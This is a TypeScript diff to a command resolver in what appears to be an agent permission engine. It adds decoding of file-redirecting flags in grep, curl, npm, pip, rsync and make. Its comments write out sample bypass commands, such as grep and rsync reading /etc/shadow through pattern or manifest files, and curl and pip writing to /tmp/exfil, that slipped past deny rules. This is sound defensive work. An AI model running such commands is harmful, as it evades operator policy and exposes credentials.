@@ -391,6 +391,33 @@ const cmdGrep: CommandResolver = (positional, tokens, ctx) => {
       if (target.length > 0 && target !== '-') {
         patternFileReads.push(resolveArg(target, ctx));
       }
+      continue;
+    }
+    // Slice 179 (review — permission-bypass P1). GNU grep also
+    // reads pattern lists from `--include-from` / `--exclude-from`
+    // / `--exclude-dir-from` — same threat shape as `-f`: an
+    // adversarial `grep --include-from /etc/shadow -r ./src`
+    // walked past `deny: read-fs:/etc/**` because the resolver
+    // didn't emit a read on the file. Mirror slice 174's `-f`
+    // decoding for these three flags.
+    if (t === '--include-from' || t === '--exclude-from' || t === '--exclude-dir-from') {
+      const next = tokens[i + 1];
+      if (next !== undefined && next !== '-' && !next.startsWith('-')) {
+        patternFileReads.push(resolveArg(next, ctx));
+        i += 1;
+      }
+      continue;
+    }
+    if (
+      t.startsWith('--include-from=') ||
+      t.startsWith('--exclude-from=') ||
+      t.startsWith('--exclude-dir-from=')
+    ) {
+      const eqIdx = t.indexOf('=');
+      const target = t.slice(eqIdx + 1);
+      if (target.length > 0 && target !== '-') {
+        patternFileReads.push(resolveArg(target, ctx));
+      }
     }
   }
 
@@ -711,6 +738,63 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
       }
       continue;
     }
+    // Slice 179 (review — permission-bypass P1). Four more curl
+    // flags missed by slices 98 + 128 + 174:
+    //   --trace <file>         writes full HTTP trace (headers +
+    //                           body) — dumps Bearer tokens etc.
+    //   --trace-ascii <file>   ASCII-only trace; same threat
+    //   --netrc-file <file>    READS credentials from netrc-shaped
+    //                           file (different path than ~/.netrc)
+    //   --cacert <file>        READS the CA bundle (cert disclosure
+    //                           if operator's policy gates it)
+    // Pre-slice `curl --trace /tmp/exfil https://api.example` walked
+    // past `deny: write-fs:/tmp/**` because the trace write was
+    // invisible. `--netrc-file` reads were invisible to operator
+    // `deny: read-fs:~/.aws/**`.
+    if (t.startsWith('--trace=')) {
+      const v = t.slice('--trace='.length);
+      if (v.length > 0) writeTargets.push(v);
+      continue;
+    }
+    if (t.startsWith('--trace-ascii=')) {
+      const v = t.slice('--trace-ascii='.length);
+      if (v.length > 0) writeTargets.push(v);
+      continue;
+    }
+    if (t === '--trace' || t === '--trace-ascii') {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        writeTargets.push(next);
+        i += 1;
+      }
+      continue;
+    }
+    if (t.startsWith('--netrc-file=')) {
+      const v = t.slice('--netrc-file='.length);
+      if (v.length > 0) readTargets.push(v);
+      continue;
+    }
+    if (t === '--netrc-file') {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        readTargets.push(next);
+        i += 1;
+      }
+      continue;
+    }
+    if (t.startsWith('--cacert=')) {
+      const v = t.slice('--cacert='.length);
+      if (v.length > 0) readTargets.push(v);
+      continue;
+    }
+    if (t === '--cacert') {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        readTargets.push(next);
+        i += 1;
+      }
+      continue;
+    }
     // Slice 174 (review — info-leak P0). curl's POST body flags
     // expand a leading `@` into "read body from this file":
     //   curl --data @/etc/shadow         (file → request body)
@@ -983,17 +1067,111 @@ const cmdGit: CommandResolver = (positional, tokens, ctx) => {
 // `cmdPkgInstall` collapsed every package manager to the SAME shape,
 // emitting npm hosts for pip and pypi hosts for npm; the audit row
 // lied about which network namespace each invocation actually reached.
-const cmdNpmLike: CommandResolver = (_positional, _tokens, ctx) => {
-  return {
-    capabilities: [
-      exec('arbitrary'),
-      writeFs(resolvePath(ctx.cwd, 'node_modules')),
-      readFs(ctx.cwd),
-      netEgress('registry.npmjs.org'),
-      netEgress('registry.yarnpkg.com'),
-    ],
-    confidence: 'medium',
-  };
+const cmdNpmLike: CommandResolver = (_positional, tokens, ctx) => {
+  // Slice 179 (review — permission-bypass P1). npm / yarn / pnpm /
+  // bun all accept flags that REDIRECT where files land:
+  //   --prefix <dir>            (npm/pnpm)  install root
+  //   --prefix=<dir>            (combined form)
+  //   --pack-destination <dir>  (npm pack)  output dir
+  //   -g / --global             writes to npm's global prefix root
+  //   --cache <dir>             (npm)       cache dir; written + read
+  //   --modules-folder <dir>    (yarn)      alt node_modules root
+  // Pre-slice the resolver hardcoded `writeFs(<cwd>/node_modules)`
+  // and an operator policy `deny: write-fs:/tmp/**` couldn't see
+  // a redirected install at `/tmp/exfil`. Decode the flag operands
+  // and emit writeFs for each redirected target so the engine's
+  // policy + §11 floor see the actual writes.
+  //
+  // We DON'T attempt to resolve `--global`'s target (it depends on
+  // the operator's npm config: `npm config get prefix`); the
+  // resolver isn't allowed to shell out. Emit a marker scope
+  // `<npm-global-prefix>` — the operator's modal renders it
+  // verbatim and a policy author who wants to gate global installs
+  // can match against the literal token. Realistic operators
+  // either trust npm globally or use confirm rules; the marker
+  // makes the intent visible in the audit row.
+  const writeTargets: string[] = [];
+  let globalFlag = false;
+  for (let i = 0; i < tokens.length; i += 1) {
+    const t = tokens[i] ?? '';
+    if (t === '-g' || t === '--global') {
+      globalFlag = true;
+      continue;
+    }
+    if (t.startsWith('--prefix=')) {
+      const v = t.slice('--prefix='.length);
+      if (v.length > 0) writeTargets.push(v);
+      continue;
+    }
+    if (t === '--prefix') {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        writeTargets.push(next);
+        i += 1;
+      }
+      continue;
+    }
+    if (t.startsWith('--pack-destination=')) {
+      const v = t.slice('--pack-destination='.length);
+      if (v.length > 0) writeTargets.push(v);
+      continue;
+    }
+    if (t === '--pack-destination') {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        writeTargets.push(next);
+        i += 1;
+      }
+      continue;
+    }
+    if (t.startsWith('--cache=')) {
+      const v = t.slice('--cache='.length);
+      if (v.length > 0) writeTargets.push(v);
+      continue;
+    }
+    if (t === '--cache') {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        writeTargets.push(next);
+        i += 1;
+      }
+      continue;
+    }
+    if (t.startsWith('--modules-folder=')) {
+      const v = t.slice('--modules-folder='.length);
+      if (v.length > 0) writeTargets.push(v);
+      continue;
+    }
+    if (t === '--modules-folder') {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        writeTargets.push(next);
+        i += 1;
+      }
+    }
+  }
+
+  const caps: Capability[] = [
+    exec('arbitrary'),
+    readFs(ctx.cwd),
+    netEgress('registry.npmjs.org'),
+    netEgress('registry.yarnpkg.com'),
+  ];
+  // Default `node_modules` under cwd is the typical landing zone;
+  // emit it unless an explicit redirect superseded it AND the
+  // command is install-shaped (the planner can choose between
+  // cwd-local install vs. redirected install at static time —
+  // hard to tell; emit both to be conservative).
+  caps.push(writeFs(resolvePath(ctx.cwd, 'node_modules')));
+  for (const p of writeTargets) caps.push(writeFs(resolveArg(p, ctx)));
+  if (globalFlag) {
+    // Marker scope — operator's policy can match literal
+    // `write-fs:<npm-global-prefix>` if they want to gate
+    // global installs. Operator modal shows this verbatim.
+    caps.push(writeFs('<npm-global-prefix>'));
+  }
+
+  return { capabilities: caps, confidence: 'medium' };
 };
 
 // Python ecosystem (pip, pip3). pip writes to site-packages (system or
@@ -1002,11 +1180,96 @@ const cmdNpmLike: CommandResolver = (_positional, _tokens, ctx) => {
 // registries (private mirrors, conda) require operator-side allow
 // rules that match the explicit `--index-url` flag — out of scope
 // for the static resolver.
-const cmdPip: CommandResolver = (_positional, _tokens, ctx) => {
-  return {
-    capabilities: [exec('arbitrary'), readFs(ctx.cwd), netEgress('pypi.org')],
-    confidence: 'medium',
-  };
+const cmdPip: CommandResolver = (_positional, tokens, ctx) => {
+  // Slice 179 (review — permission-bypass P1). pip redirects writes
+  // via several flags that pre-slice the resolver ignored:
+  //   --target <dir>            install into <dir> (instead of
+  //                              site-packages)
+  //   --target=<dir>            combined form
+  //   --prefix <dir>            install root prefix
+  //   --root <dir>              install to <dir>/PREFIX
+  //   --user                    install to user's site-packages
+  //                              (~/.local/lib/...)
+  //   --cache-dir <dir>         cache dir (writes wheel cache)
+  //   --no-cache-dir            disables cache (no-op for caps)
+  //   -d / --download <dir>     (deprecated) download to dir
+  //   -t <dir>                  short form of --target
+  // Pre-slice `pip install --target /tmp/exfil foo` walked past
+  // `deny: write-fs:/tmp/**`. Decode each and emit writeFs so the
+  // engine sees the actual redirected write.
+  const writeTargets: string[] = [];
+  let userFlag = false;
+  for (let i = 0; i < tokens.length; i += 1) {
+    const t = tokens[i] ?? '';
+    if (t === '--user') {
+      userFlag = true;
+      continue;
+    }
+    if (t === '--target' || t === '-t') {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        writeTargets.push(next);
+        i += 1;
+      }
+      continue;
+    }
+    if (t.startsWith('--target=')) {
+      const v = t.slice('--target='.length);
+      if (v.length > 0) writeTargets.push(v);
+      continue;
+    }
+    if (t === '--prefix' || t === '--root') {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        writeTargets.push(next);
+        i += 1;
+      }
+      continue;
+    }
+    if (t.startsWith('--prefix=')) {
+      const v = t.slice('--prefix='.length);
+      if (v.length > 0) writeTargets.push(v);
+      continue;
+    }
+    if (t.startsWith('--root=')) {
+      const v = t.slice('--root='.length);
+      if (v.length > 0) writeTargets.push(v);
+      continue;
+    }
+    if (t === '--cache-dir') {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        writeTargets.push(next);
+        i += 1;
+      }
+      continue;
+    }
+    if (t.startsWith('--cache-dir=')) {
+      const v = t.slice('--cache-dir='.length);
+      if (v.length > 0) writeTargets.push(v);
+      continue;
+    }
+    if (t === '-d' || t === '--download') {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        writeTargets.push(next);
+        i += 1;
+      }
+    }
+  }
+
+  const caps: Capability[] = [exec('arbitrary'), readFs(ctx.cwd), netEgress('pypi.org')];
+  for (const p of writeTargets) caps.push(writeFs(resolveArg(p, ctx)));
+  if (userFlag) {
+    // `pip install --user foo` writes to `~/.local/lib/python*/site-packages`.
+    // Emit a tilde-expanded scope so the engine's protected-path
+    // classifier sees the home-relative write. We don't pin the
+    // python version — the operator's policy patterns can use
+    // `write-fs:~/.local/**` to gate broadly.
+    caps.push(writeFs(resolveArg('~/.local', ctx)));
+  }
+
+  return { capabilities: caps, confidence: 'medium' };
 };
 
 const cmdChmodChown: CommandResolver = (positional, _tokens, ctx) => {
@@ -1728,6 +1991,34 @@ const cmdRsync: CommandResolver = (positional, tokens, ctx) => {
     }
   }
 
+  // Slice 179 (review — permission-bypass P1). `--files-from <file>`
+  // and `--exclude-from <file>` / `--include-from <file>` read
+  // source/filter manifests from disk. Pre-slice neither was
+  // decoded — an adversarial `rsync --files-from /etc/shadow user@x:`
+  // walked past `deny: read-fs:/etc/**` because the manifest read
+  // was invisible. Decode both space-separated and `=` forms.
+  const manifestFileReads: string[] = [];
+  for (let i = 0; i < tokens.length; i += 1) {
+    const t = tokens[i] ?? '';
+    if (t === '--files-from' || t === '--exclude-from' || t === '--include-from') {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        manifestFileReads.push(next);
+        i += 1;
+      }
+      continue;
+    }
+    if (
+      t.startsWith('--files-from=') ||
+      t.startsWith('--exclude-from=') ||
+      t.startsWith('--include-from=')
+    ) {
+      const eqIdx = t.indexOf('=');
+      const v = t.slice(eqIdx + 1);
+      if (v.length > 0) manifestFileReads.push(v);
+    }
+  }
+
   const dest = positional[positional.length - 1] as string;
   const sources = positional.slice(0, -1);
   const anyRemote = isRemote(dest) || sources.some(isRemote);
@@ -1735,6 +2026,9 @@ const cmdRsync: CommandResolver = (positional, tokens, ctx) => {
   const caps: Capability[] = [];
   if (anyRemote) caps.push(readFs(resolveArg('~/.ssh', ctx)));
   if (passwordFile !== null) caps.push(readFs(resolveArg(passwordFile, ctx)));
+  // Slice 179: manifest reads from --files-from / --exclude-from /
+  // --include-from. Each file is read once at rsync startup.
+  for (const p of manifestFileReads) caps.push(readFs(resolveArg(p, ctx)));
 
   if (isRemote(dest)) {
     caps.push(netEgress(extractHost(dest)));
@@ -1755,9 +2049,37 @@ const cmdRsync: CommandResolver = (positional, tokens, ctx) => {
 // side effects. We don't try to parse the Makefile — exec:arbitrary
 // is the honest capability shape, matching the cmdInterpreter
 // pattern for "this runs untrusted code".
-const cmdMake: CommandResolver = (_positional, _tokens, ctx) => {
+const cmdMake: CommandResolver = (_positional, tokens, ctx) => {
+  // Slice 179 (review — permission-bypass P2). `make -C <dir>` (and
+  // `--directory=<dir>`) shifts make's working directory before any
+  // Makefile read or recipe run. Pre-slice the resolver emitted
+  // `readFs(ctx.cwd)` / `writeFs(ctx.cwd)` unconditionally —
+  // `make -C /etc/agent target` would NOT surface `/etc/agent` to
+  // the operator's policy or the §11 escalate-tier classifier.
+  //
+  // Parse `-C <dir>` / `--directory <dir>` / `--directory=<dir>` and
+  // shift the scope. If multiple -C flags appear, the LAST one wins
+  // (make's actual behavior: each -C overrides the previous). We
+  // accept the rightmost as the effective root.
+  let workDir: string | null = null;
+  for (let i = 0; i < tokens.length; i += 1) {
+    const t = tokens[i] ?? '';
+    if (t === '-C' || t === '--directory') {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        workDir = next;
+        i += 1;
+      }
+      continue;
+    }
+    if (t.startsWith('--directory=')) {
+      const v = t.slice('--directory='.length);
+      if (v.length > 0) workDir = v;
+    }
+  }
+  const root = workDir !== null ? resolveArg(workDir, ctx) : ctx.cwd;
   return {
-    capabilities: [exec('arbitrary'), readFs(ctx.cwd), writeFs(ctx.cwd)],
+    capabilities: [exec('arbitrary'), readFs(root), writeFs(root)],
     confidence: 'medium',
   };
 };
